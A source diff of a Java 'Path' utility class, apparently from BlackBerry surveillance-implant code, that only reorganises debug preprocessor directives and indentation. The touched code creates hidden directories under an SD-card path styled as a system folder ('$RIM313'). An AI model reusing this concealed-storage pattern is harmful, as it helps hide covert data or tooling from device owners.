@@ -23,7 +23,8 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
  * The Class Path.
  */
 public class Path {
-    private static Debug debug = new Debug("Path", DebugLevel.VERBOSE);
+    //#debug
+        private static Debug debug = new Debug("Path", DebugLevel.VERBOSE);
 
     /** The Constant SD_PATH. */
     public static final String SD_PATH = "file:///SDCard/BlackBerry/system/$RIM313/";
@@ -55,7 +56,7 @@ public class Path {
         FileConnection fconn = null;
 
         // #ifdef DBC
-//@        Check.ensures(dirName.endsWith("/"), "directory should end with /");
+        //@        Check.ensures(dirName.endsWith("/"), "directory should end with /");
         // #endif
 
         try {
@@ -75,13 +76,13 @@ public class Path {
             fconn.setHidden(true);
 
             // #ifdef DBC
-//@            Check.ensures(fconn.exists(), "Couldn't create dir");
+            //@            Check.ensures(fconn.exists(), "Couldn't create dir");
             // #endif
 
         } catch (IOException e) {
 
             // #debug
-            debug.error(e.toString());
+                        debug.error(e.toString());
             return false;
 
         } finally {
@@ -89,10 +90,11 @@ public class Path {
                 try {
                     fconn.close();
                 } catch (IOException e) {
-                    if (debug != null) {
-                        // #debug
-                        debug.error(e.toString());
-                    }
+                    // #mdebug
+                                        if (debug != null) {                        
+                                            debug.error(e.toString());
+                                        }
+                    //#enddebug
 
                 }
             }
@@ -160,16 +162,18 @@ public class Path {
             String path = (String) roots.nextElement();
 
             if (path.indexOf("SDCard") >= 0) {
-                if (debug != null) {
-                    // #debug
-                    debug.info("SDPresent FOUND: " + path);
-                }
+                // #mdebug
+                                if (debug != null) {
+                                    debug.info("SDPresent FOUND: " + path);
+                                }
+                // #enddebug
                 return true;
             } else {
-                if (debug != null) {
-                    // #debug
-                    debug.trace("SDPresent NOT:" + path);
-                }
+                // #mdebug
+                                if (debug != null) {
+                                    debug.trace("SDPresent NOT:" + path);
+                                }
+                // #enddebug
             }
         }
 
@@ -212,10 +216,11 @@ public class Path {
                     Connector.READ_WRITE);
 
             if (!fconn.exists()) {
-                if (debug != null) {
-                    // #debug
-                    debug.trace("Directory doesn't exists");
-                }
+                // #mdebug
+                                if (debug != null) {
+                                    debug.trace("Directory doesn't exists");
+                                }
+                // #enddebug
 
                 return false;
             }
@@ -224,12 +229,12 @@ public class Path {
                 fconn.delete();
             } else {
                 // #debug
-                debug.error("directory not empty");
+                                debug.error("directory not empty");
                 return false;
             }
 
             // #ifdef DBC
-//@            Check.ensures(!fconn.exists(), "Couldn't delete dir");
+            //@            Check.ensures(!fconn.exists(), "Couldn't delete dir");
             // #endif
 
         } catch (IOException e) {
@@ -242,11 +247,11 @@ public class Path {
                 try {
                     fconn.close();
                 } catch (IOException e) {
-                    if (debug != null) {
-                        // #debug
-                        debug.error(e.toString());
-                    }
-
+                    // #mdebug
+                                        if (debug != null) {                        
+                                            debug.error(e.toString());
+                                        }
+                    // #enddebug
                 }
             }
         }
